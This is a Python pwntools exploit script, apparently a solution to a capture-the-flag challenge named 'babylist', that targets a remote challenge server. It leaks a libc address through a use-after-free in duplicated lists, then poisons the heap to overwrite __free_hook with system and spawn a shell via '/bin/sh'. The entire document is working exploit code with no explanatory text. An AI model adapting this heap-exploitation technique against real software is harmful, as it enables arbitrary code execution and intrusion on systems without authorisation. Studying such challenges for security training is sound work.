from pwn import *

bin = ELF('./babylist')
libc = ELF('./libc-2.27.so', checksec=False)

LOCAL = False

one_gadget_offset = [0x4f2c5, 0x4f322, 0x10a38c]


def create_list(name):
    conn.sendlineafter('> ', str(1))
    conn.sendlineafter('name for list:\n', name)
    conn.recvuntil('List has been created!\n')


def add_element(idx, num):
    conn.sendlineafter('> ', str(2))
    conn.sendlineafter('Enter index of list:\n', str(idx))
    conn.sendlineafter('Enter number to add:\n', str(num))
    conn.recvuntil('Number successfully added to list!\n')


def view_element(list_idx, idx):
    conn.sendlineafter('> ', str(3))
    conn.sendlineafter('Enter index of list:\n', str(list_idx))
    conn.sendlineafter('Enter index into list:\n', str(idx))


def duplicate_list(idx, name):
    conn.sendlineafter('> ', str(4))
    conn.sendlineafter('Enter index of list:\n', str(idx))
    conn.sendlineafter('Enter name for new list:\n', name)
    conn.recvuntil('List has been duplicated!\n')


def remove_list(idx):
    conn.sendlineafter('> ', str(5))
    conn.sendlineafter('Enter index of list:\n', str(idx))
    conn.recvuntil('List has been deleted!\n')


if LOCAL:
    conn = process('./babylist', env={'LD_PRELOAD': './libc-2.27.so'})
    gdb.attach(conn)
else:
    conn = remote('challenges.fbctf.com', 1343)

# Stage 1: Libc Leak
create_list('AAAAAAAA')

for i in range(64):
    log.info(str(i))
    add_element(0, 1)

for i in range(8):
    duplicate_list(0, 'BBBBBBBB')

for i in range(8):
    add_element(i, 1)

view_element(8, 0)

conn.recvuntil('BBBBBBBB[0] = ')
lower = conn.recvuntil('\n')[:-1]
if lower.startswith('-'):
    lower = ~int(lower[1:]) + 1
else:
    lower = int(lower)

view_element(8, 1)
conn.recvuntil('BBBBBBBB[1] = ')
higher = int(conn.recvuntil('\n')[:-1]) + 1

libc_addr = (higher << 32) + lower - 0x3ebca0
log.info('Libc_addr: ' + hex(libc_addr))
log.info('One_gadget_addr: ' + hex(libc_addr + one_gadget_offset[1]))

# Stage 2
for i in range(9):
    remove_list(i)

create_list('CCCCCCCC')  # 0

for i in range(32):
    add_element(0, 1)

duplicate_list(0, 'DDDDDDDD')  # 1
duplicate_list(0, 'DDDDDDDD')  # 2

add_element(0, 1)
add_element(1, 1)

create_list(p64(libc_addr + libc.symbols['__free_hook']))  # 3
create_list('/bin/sh\x00')  # 4
create_list(p64(libc_addr + libc.symbols['system']))  # 5

conn.interactive()